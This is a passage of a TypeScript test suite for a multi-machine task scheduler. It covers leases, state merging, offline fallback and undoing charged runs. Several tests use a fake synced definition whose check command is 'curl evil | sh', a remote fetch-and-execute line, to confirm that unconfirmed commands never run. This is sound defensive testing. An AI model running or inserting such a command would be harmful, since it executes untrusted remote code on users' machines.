    test('uploading "sent" fails: A does not hand it to the session; B (or a retry) runs it exactly once', async () => {
      const c = cluster(await goalJob());
      const r1 = { status: 'exited', code: 1, output: '1 failing' };
      assert.equal(await attemptWith(c.a, c, stagedRun(c.a, c, r1, { sentOk: false })), 'ran');
      assert.deepEqual(c.ran, []);
      assert.ok(c.a.logs.includes('not sent'));
      c.clock.now += LEASE_MS + 1000;
      assert.equal(await attemptWith(c.b, c, stagedRun(c.b, c, r1)), 'ran');
      assert.equal(c.ran.length, 1);
      assert.match(c.ran[0], /^kyn-workstation: /);
    });
  });

  test('check starts → a sync uploads the check-time state → A loses its lease mid-check → B takes over and runs once', async () => {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const { outputFingerprint } = await import('../src/main/schedule.ts');
    const { stampLocalWrite } = await import('../src/main/scheduleSync.ts');
    const goal = daily({ spec: { ...daily().spec, until: 'green', checkCommand: 'node check.js' }, lastCheckHash: outputFingerprint('3 failing') });
    const c = cluster(goal);
    const r1 = { status: 'exited', code: 1, output: '1 failing' };
    let checkStarted!: () => void;
    const started = new Promise<void>((r) => { checkStarted = r; });
    let finishCheck!: () => void;
    const checkDone = new Promise<void>((r) => { finishCheck = r; });
    /* index.ts order: snapshot → markCheckPending (bucket mode) → real check (writes stamped) → charge → … */
    const run = (m: Machine, hang: boolean) => async (state: ScheduleState, runFor: number, lease: RunLease) => {
      const preCheck = m.local!;
      let st = state;
      if (!lease.offline) { st = markPendingRun(state, preCheck, runFor, m.me, c.clock.now, preCheck); m.local = st; }   // markCheckPending
      const checked = await runScheduleCheck('j1', st, {
        now: () => c.clock.now, read: () => m.local, write: (_id, s) => { m.local = stampLocalWrite(m.local, s, m.me, c.clock.now); },
        runCheck: async () => { if (hang) { checkStarted(); await checkDone; } return r1; },
        changed: () => {}, noteUser: () => {}, log: () => {}, lang: 'en', stillRunsHere: () => !lease.lost(),
      });
      if (!checked || lease.lost()) { m.logs.push('check result dropped'); return; }
      m.local = markPendingRun(chargeRun(checked.state, runFor, m.me, c.clock.now), m.local!, runFor, m.me, c.clock.now, preCheck);
      c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
      c.ran.push(`${m.me.name}: ${checked.text.split('\n')[0]}`);
      m.local = { ...m.local!, pendingRun: null };
      c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
    };
    const pendingA = attemptWith(c.a, c, run(c.a, true));
    await started;
    /* a regular sync while the check is running: the check time (and the note) go up; B pulls it */
    c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(c.a.local), etag: 'x' });
    c.b.local = mergeSchedule(c.b.local!, JSON.parse(c.bucket.objects.get(STATE_KEY)!.body), B.id).state;
    assert.equal(isDue(c.b.local!, c.clock.now), false, 'precondition: B now sees the check time → "not due"');
    assert.ok(c.b.local!.pendingRun, 'but it also sees "charged/started, not confirmed"');
    /* A goes silent: renewals fail until its lease expires */
    c.bucket.down = true;
    for (let i = 0; i < 6; i += 1) { c.clock.now += 60_000; c.a.timers[0]?.(); await new Promise((r) => setTimeout(r, 2)); }
    c.bucket.down = false;
    assert.equal(await attemptWith(c.b, c, run(c.b, false)), 'ran', 'B takes over (not "not-due")');
    finishCheck();
    await pendingA;
    assert.ok(c.a.logs.includes('check result dropped'), 'A\'s late check result is dropped');
    assert.equal(c.ran.length, 1, 'exactly one report');
    assert.match(c.ran[0], /^kyn-workstation: 🔎 The check command exited with 1/);
  });

  test('B cached the "charged, not yet sent" version; A then marks "sent" and dies before confirming → B adopts "sent" and does not send again', async () => {
    const { markSent } = await import('../src/main/scheduleLease.ts');
    const c = cluster();
    const runFor = plannedRunFor(c.a.local!, c.clock.now);
    /* A wins the lease, charges (with the note) and publishes — B syncs that unsent version */
    const got = await acquireLease(c.bucket, KEY, A, runFor, c.clock.now);
    assert.equal(got.ok, true);
    const before = c.a.local!;
    c.a.local = markPendingRun(chargeRun(before, runFor, A, c.clock.now), before, runFor, A, c.clock.now);
    c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(c.a.local), etag: 'x' });
    c.b.local = mergeSchedule(c.b.local!, JSON.parse(c.bucket.objects.get(STATE_KEY)!.body), B.id).state;
    assert.equal(c.b.local!.pendingRun?.sent ?? false, false, 'B holds the unsent version');
    /* A hands it to the session (same millisecond on purpose: the merge must not depend on the clock alone), then dies */
    c.a.local = markSent(c.a.local!, A, c.clock.now);
    c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(c.a.local), etag: 'x' });
    c.ran.push('A sent');
    c.clock.now += LEASE_MS + 1000;
    /* B's next sync / takeover */
    const merged = mergeSchedule(c.b.local!, JSON.parse(c.bucket.objects.get(STATE_KEY)!.body), B.id).state;
    assert.equal(merged.pendingRun?.sent, true, '"sent" is never merged back to "not sent"');
    c.b.local = merged;
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c)), 'already-ran');
    assert.deepEqual(c.ran, ['A sent'], 'not sent a second time');
    assert.equal(c.b.local!.runs, 7, 'the charge from A stands');
  });

  test('merge: same slot, same statusAt — "sent" beats "not yet sent" in either order; a later slot still wins', async () => {
    const { markSent } = await import('../src/main/scheduleLease.ts');
    const base = daily();
    const unsent = markPendingRun(chargeRun(base, T0, A, T0 + 5), base, T0, A, T0 + 5);
    const sent = { ...markSent(unsent, A, T0 + 5), statusAt: unsent.statusAt };
    assert.equal(mergeSchedule(unsent, sent, B.id).state.pendingRun?.sent, true);
    assert.equal(mergeSchedule(sent, unsent, B.id).state.pendingRun?.sent, true);
    assert.ok((markSent(unsent, A, T0 + 9).statusAt ?? 0) > (unsent.statusAt ?? 0), 'markSent writes a newer version');
    const nextSlot = markPendingRun(chargeRun(sent, T0 + 86400_000, B, T0 + 86400_500), sent, T0 + 86400_000, B, T0 + 86400_500);
    assert.equal(mergeSchedule(sent, nextSlot, A.id).state.lastRunFor, T0 + 86400_000, 'a newer planned slot wins regardless');
  });

  test('offline fallback: a paused task with a stale "not confirmed" note is not run (no check command either)', async () => {
    const c = cluster(daily({ paused: true, pausedChangedAt: T0 }));
    const before = c.a.local!;
    c.a.local = markPendingRun(chargeRun(before, T0, A, T0 - LEASE_MS * 2), before, T0, A, T0 - LEASE_MS * 2);
    assert.equal(pendingStale(c.a.local!, c.clock.now), true, 'precondition: stale note lets it through the "due" gate');
    let called = 0;
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => c.clock.now, bucket: null, leaseKey: KEY,
      eligible: () => true, readLocal: () => c.a.local, fetchRemote: async () => null, adopt: (x) => x,
      persist: (st) => { c.a.local = st; },
      run: async () => { called += 1; }, every: () => () => {}, log: (x) => c.a.logs.push(x),
    });
    assert.equal(r, 'blocked');
    assert.equal(called, 0, 'nothing ran');
    assert.equal(c.a.local!.pendingRun, null, 'the note was settled');
    assert.equal(c.a.local!.paused, true);
  });

  test('restorePending undoes the check outcome but not a user pause; an auto-pause from that check is lifted', () => {
    const pre = { ...daily(), lastCheckHash: 'h0', checkErrors: 2, lastCheck: null };
    const afterCheck = { ...pre, lastRunAt: T0 + 5, lastCheckHash: 'h1', checkErrors: 3, paused: true, pausedBy: 'check-errors' as const, terminal: null };
    const marked = markPendingRun(chargeRun(afterCheck, T0, A, T0 + 6), afterCheck, T0, A, T0 + 6, pre);
    const r = restorePending(marked);
    assert.equal(r.lastRunAt, pre.lastRunAt, 'check time undone');
    assert.equal(r.lastCheckHash, 'h0');
    assert.equal(r.checkErrors, 2);
    assert.equal(r.paused, false, 'the auto-pause from this check is lifted');
    const userPaused = restorePending({ ...marked, pausedBy: null });
    assert.equal(userPaused.paused, true, 'a user pause is kept');
    const achieved = markPendingRun(chargeRun({ ...pre, terminal: 'achieved' }, T0, A, T0 + 6), pre, T0, A, T0 + 6, pre);
    assert.equal(restorePending(achieved).terminal, null, 'achieved from this check is undone');
  });

  test('restorePending / markPendingRun', () => {
    const before = daily();
    const charged = markPendingRun(chargeRun(before, T0, A, T0 + 5), before, T0, A, T0 + 5);
    assert.deepEqual(charged.pendingRun, {
      runFor: T0, by: A.id, at: T0 + 5,
      prev: { runs: 6, lastRunAt: before.lastRunAt, lastRunFor: before.lastRunFor, lastCheckHash: null, lastCheck: null, checkErrors: 0, terminal: null, autoPaused: false },
    });
    const restored = restorePending(charged);
    assert.equal(restored.runs, 6);
    assert.equal(restored.lastRunFor, before.lastRunFor);
    assert.equal(restored.pendingRun, null);
    assert.equal(pendingStale(charged, T0 + 5 + LEASE_MS - 1), false);
    assert.equal(pendingStale(charged, T0 + 5 + LEASE_MS + 1), true);
  });
});

describe('review follow-ups 3: offline fallback and undo through the real commit step', () => {
  const attemptReal = (m: Machine, c: ReturnType<typeof cluster>, run: (s: ScheduleState, f: number, l: RunLease) => Promise<void>, extra: Record<string, unknown> = {}) => attemptScheduleRun('j1', {
    me: m.me, now: () => c.clock.now, bucket: c.bucket, leaseKey: KEY,
    eligible: (st) => definitionApproved(st, m.approved), readLocal: () => m.local,
    fetchRemote: async () => { const o = c.bucket.objects.get(STATE_KEY); return o ? JSON.parse(o.body) : null; },
    adopt: (remote) => (m.local = mergeSchedule(m.local!, remote, m.me.id).state),
    run, every: () => () => {}, log: (x) => m.logs.push(x), ...extra,
  });
  /** The real commit step for a run, the way index.ts wires it (offline = no bucket for this run). */
  function realRun(m: Machine, c: ReturnType<typeof cluster>, hooks: { duringPublish?: () => void } = {}) {
    return async (state: ScheduleState, runFor: number, lease: RunLease) => {
      const before = m.local!;
      m.local = chargeRun(state, runFor, m.me, c.clock.now);
      const ok = await commitCharge(before, {
        offline: lease.offline, lost: lease.lost,
        publish: async () => { await Promise.resolve(); hooks.duringPublish?.(); if (c.bucket.down) return false; c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' }); return true; },
        readCurrent: () => (m.deleted ? null : m.local), deleted: () => m.deleted,
        writeRaw: (st) => { m.local = st; }, log: (x) => m.logs.push(x),
      });
      if (ok) c.ran.push(`${m.me.name}@${runFor} woke`);
    };
  }

  test('network down while grabbing the lease: the creator still runs AND wakes the session (local accounting, no upload needed)', async () => {
    const c = cluster();
    c.bucket.down = true;
    assert.equal(await attemptReal(c.a, c, realRun(c.a, c)), 'offline-ran');
    assert.equal(c.ran.length, 1, 'woken despite the bucket being unreachable');
    assert.equal(c.a.local!.runs, 7, 'charged locally');
    assert.equal(await attemptReal(c.b, c, realRun(c.b, c)), 'offline-not-creator');
    assert.equal(c.ran.length, 1);
  });

  test('lease won, state read fails, creator runs: offline fallback too → wakes without requiring the upload', async () => {
    const c = cluster();
    const extra = { fetchRemote: async () => { c.bucket.down = true; throw new Error('GET failed'); } };
    assert.equal(await attemptReal(c.a, c, realRun(c.a, c), extra), 'ran');
    assert.equal(c.ran.length, 1);
    assert.equal(c.a.local!.runs, 7);
  });

  test('upload fails while the user pauses / extends the task: only the run accounting is undone — pause, expiry and definition stay', async () => {
    const c = cluster();
    const realRunPausing = realRun(c.a, c, { duringPublish: () => {
      c.a.local = { ...c.a.local!, paused: true, pausedChangedAt: c.clock.now, expiresAt: T0 + 9e6, expiryChangedAt: c.clock.now };
      c.bucket.down = true;
    } });
    assert.equal(await attemptReal(c.a, c, realRunPausing), 'ran');
    assert.deepEqual(c.ran, [], 'not woken');
    assert.equal(c.a.local!.paused, true, 'the user\'s pause survives the undo');
    assert.equal(c.a.local!.expiresAt, T0 + 9e6, 'the new expiry survives');
    assert.equal(c.a.local!.runs, 6, 'the run is undone');
    assert.equal(c.a.local!.lastRunFor, daily().lastRunFor, 'the slot is undone');
    assert.equal(c.a.local!.spec.prompt, daily().spec.prompt);
  });

  test('upload fails after the task was deleted meanwhile: nothing is written back', async () => {
    const c = cluster();
    let writes = 0;
    const run = async (state: ScheduleState, runFor: number, lease: RunLease) => {
      const before = c.a.local!;
      c.a.local = chargeRun(state, runFor, c.a.me, c.clock.now);
      await commitCharge(before, {
        offline: lease.offline, lost: lease.lost,
        publish: async () => { c.a.deleted = true; c.a.local = null; return false; },
        readCurrent: () => c.a.local, deleted: () => c.a.deleted,
        writeRaw: () => { writes += 1; }, log: () => {},
      });
    };
    await attemptReal(c.a, c, run);
    assert.equal(writes, 0, 'not resurrected');
    assert.equal(c.a.local, null);
    /* a tombstone with the file still present (deleted elsewhere, not yet cleaned up here) is not written either */
    const keep = daily();
    let w2 = 0;
    await commitCharge(keep, { offline: false, lost: () => false, publish: async () => false, readCurrent: () => keep, deleted: () => true, writeRaw: () => { w2 += 1; }, log: () => {} });
    assert.equal(w2, 0);
  });

  test('the unchanged-output mark undoes only the slot + "last run by" (check result and pause stay)', () => {
    const before = daily();
    const now = { ...before, lastRunFor: T0, runner: B.id, runnerName: B.name, runnerChangedAt: T0, paused: true, lastCheck: { at: T0, result: 'unchanged' as const, code: 1, output: 'same' } };
    const undone = undoCharge(now, before, MARK_KEYS);
    assert.equal(undone.lastRunFor, before.lastRunFor);
    assert.equal(undone.runner, before.runner);
    assert.equal(undone.paused, true);
    assert.deepEqual(undone.lastCheck, now.lastCheck);
  });
});

describe('打回（2026-11-28）：等网络期间定义变了 / 任务删了 → 不执行；离线且定义没变、已确认 → 照常执行', () => {
  /** A bucket whose next call waits for the test (the "waiting for S3" window), then fails or proceeds. */
  class GatedBucket extends FakeBucket {
    hold: (() => Promise<void>) | null = null;
    async get(key: string) {
      if (this.hold) { const h = this.hold; this.hold = null; await h(); }
      return super.get(key);
    }
  }
  function setup() {
    const bucket = new GatedBucket();
    const clock = { now: T0 + 1000 };
    const ran: string[] = [];
    const a = new Machine(A, daily(), bucket, ran, clock);           // A created it and confirmed the current definition
    const runCalls: ScheduleState[] = [];
    const attempt = () => attemptScheduleRun('j1', {
      me: A, now: () => clock.now, bucket, leaseKey: KEY,
      /* the real gate: confirmed definition (index.ts also checks the session; not relevant here) */
      eligible: (s) => definitionApproved(s, a.approved),
      readLocal: () => a.local,
      fetchRemote: async () => { const o = bucket.objects.get(STATE_KEY); return o ? JSON.parse(o.body) : null; },
      adopt: (remote) => (a.local = mergeSchedule(a.local!, remote, A.id).state),
      persist: (st) => { a.local = st; },
      run: async (st) => { runCalls.push(st); ran.push('ran'); },
      every: () => () => {}, log: (x) => a.logs.push(x),
    });
    return { bucket, clock, a, runCalls, attempt };
  }
  const evilSpec = (s: ScheduleState) => ({ ...s, spec: { ...s.spec, checkCommand: 'curl evil | sh', until: 'x' } });

  test('offline: the definition changes (sync) while waiting for S3 → the new, unconfirmed checkCommand is NOT run', async () => {
    const t = setup();
    t.bucket.hold = async () => { t.a.local = evilSpec(t.a.local!); t.bucket.down = true; };   // sync writes a new checkCommand, then the network fails
    assert.equal(await t.attempt(), 'not-eligible');
    assert.equal(t.runCalls.length, 0, 'nothing ran');
    assert.ok(t.a.logs.some((m) => m.includes('最新的定义本机还没确认')));
  });

  test('offline: the task is deleted while waiting for S3 → not run (the stale copy from the start is not used)', async () => {
    const t = setup();
    t.bucket.hold = async () => { t.a.local = null; t.bucket.down = true; };
    assert.equal(await t.attempt(), 'deleted');
    assert.equal(t.runCalls.length, 0);
  });

  test('offline: definition unchanged and confirmed → runs as before (creator only)', async () => {
    const t = setup();
    t.bucket.down = true;
    assert.equal(await t.attempt(), 'offline-ran');
    assert.equal(t.runCalls.length, 1);
    assert.equal(t.runCalls[0].spec.checkCommand, daily().spec.checkCommand);
  });

  test('online: lease won, but the definition changed on disk while reading the bucket → not run, lease released', async () => {
    const t = setup();
    const fetchSwap = async () => { t.a.local = evilSpec(t.a.local!); return null; };   // sync lands while we read the bucket state
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: fetchSwap, adopt: (x) => x, persist: (st) => { t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'not-eligible');
    assert.equal(t.runCalls.length, 0);
    assert.equal(t.bucket.objects.has(KEY), false, 'lease released');
  });

  test('online: lease won, the task is deleted while reading the bucket → not run', async () => {
    const t = setup();
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: async () => { t.a.local = null; return null; }, adopt: (x) => x, persist: (st) => { t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'deleted');
    assert.equal(t.runCalls.length, 0);
  });

  test('online, state read fails (creator fallback) and the definition changed meanwhile → not run', async () => {
    const t = setup();
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: async () => { t.a.local = evilSpec(t.a.local!); throw new Error('GET failed'); },
      adopt: (x) => x, persist: (st) => { t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'not-eligible');
    assert.equal(t.runCalls.length, 0);
  });

  /** A carries an unfinished run's note (charged, not sent, older than one lease) — the path that restores and writes back. */
  function withStaleNote(t: ReturnType<typeof setup>) {
    const before = t.a.local!;
    t.a.local = markPendingRun(chargeRun(before, T0 - 86400_000, B, T0 - 2 * LEASE_MS), before, T0 - 86400_000, B, T0 - 2 * LEASE_MS);
    t.bucket.objects.set(STATE_KEY, { body: JSON.stringify(t.a.local), etag: 'x' });
  }

  test('online with an unfinished-run note: the task is deleted while reading the bucket → not run, and NOT written back', async () => {
    const t = setup();
    withStaleNote(t);
    let writes = 0;
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: async () => { const o = JSON.parse(t.bucket.objects.get(STATE_KEY)!.body); t.a.local = null; return o; },   // deleted meanwhile
      adopt: (remote) => { writes += 1; return (t.a.local = remote); },
      persist: (st) => { writes += 1; t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'deleted');
    assert.equal(t.runCalls.length, 0, 'not run');
    assert.equal(writes, 0, 'no adopt / persist before the check');
    assert.equal(t.a.local, null, 'the deleted task was not re-created');
    assert.equal(t.bucket.objects.has(KEY), false, 'lease released');
  });

  test('online with an unfinished-run note: the definition changes while reading the bucket → not run, nothing restored or written', async () => {
    const t = setup();
    withStaleNote(t);
    let writes = 0;
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: async () => { t.a.local = evilSpec(t.a.local!); return null; },
      adopt: (remote) => { writes += 1; return remote; },
      persist: (st) => { writes += 1; t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'not-eligible');
    assert.equal(t.runCalls.length, 0);
    assert.equal(writes, 0);
    assert.equal(t.a.local!.spec.checkCommand, 'curl evil | sh', 'left as synced, not overwritten with the old copy');
  });

  test('online with an unfinished-run note, nothing changed meanwhile → the note is taken over and the slot runs once (control)', async () => {
    const t = setup();
    withStaleNote(t);
    const r = await attemptScheduleRun('j1', {
      me: A, now: () => t.clock.now, bucket: t.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, t.a.approved), readLocal: () => t.a.local,
      fetchRemote: async () => JSON.parse(t.bucket.objects.get(STATE_KEY)!.body),
      adopt: (remote) => (t.a.local = mergeSchedule(t.a.local!, remote, A.id).state),
      persist: (st) => { t.a.local = st; },
      run: async (st) => { t.runCalls.push(st); }, every: () => () => {}, log: (x) => t.a.logs.push(x),
    });
    assert.equal(r, 'ran');
    assert.equal(t.runCalls.length, 1);
    assert.equal(t.runCalls[0].pendingRun ?? null, null, 'the unconfirmed charge was undone before running');
  });

  test('wired: persist never re-creates a deleted task (index.ts)', () => {
    const MAIN = fs.readFileSync(new URL('../src/main/index.ts', import.meta.url), 'utf-8');
    assert.match(MAIN, /persist: \(st\) => \{\s*if \(!scheduleStore\.readSchedule\(id, home\) \|\| scheduleStore\.readScheduleTombstones\(home\)\[id\]\) return;/);
  });

  test('wired: the check command itself re-checks the latest definition on disk before it runs (index.ts)', () => {
    const MAIN = fs.readFileSync(new URL('../src/main/index.ts', import.meta.url), 'utf-8');
    const at = MAIN.indexOf('function runScheduleCheck(id: string, state: ScheduleState)');
    const body = MAIN.slice(at, MAIN.indexOf('return runScheduleCheckWith(id, state, {', at));
    assert.match(body, /const disk = scheduleStore\.readSchedule\(id, os\.homedir\(\)\);/);
    assert.match(body, /if \(!disk \|\| !scheduleEligibleHere\(disk\) \|\| definitionHash\(disk\.state\) !== definitionHash\(state\)\) \{[\s\S]*return Promise\.resolve\(null\);/);
  });
});

describe('lease helpers', () => {
  test('lease keys round-trip and are not mistaken for tasks', async () => {
    assert.equal(KEY, 'schedules/s1/j1.lease.json');
    assert.deepEqual(parseLeaseRel(KEY), { sessionId: 's1', id: 'j1' });
    const { parseScheduleObjectRel } = await import('../src/main/scheduleSync.ts');
    assert.equal(parseScheduleObjectRel(KEY), null);
  });

  test('merge: run state follows the newest planned slot; creator kept', () => {
    const base = daily();
    const ranOnB = chargeRun(base, T0, B, T0 + 5000);
    const m = mergeSchedule(base, ranOnB, A.id).state;
    assert.equal(m.runs, 7);
    assert.equal(m.runner, B.id);
    assert.equal(m.lastRunFor, T0);
    assert.equal(m.creator, A.id);
    /* a stale copy (older slot) never rolls it back */
    assert.equal(mergeSchedule(m, base, A.id).state.runs, 7);
    assert.equal(stableStringify(mergeSchedule(m, m, A.id).state), stableStringify(m));
  });
});
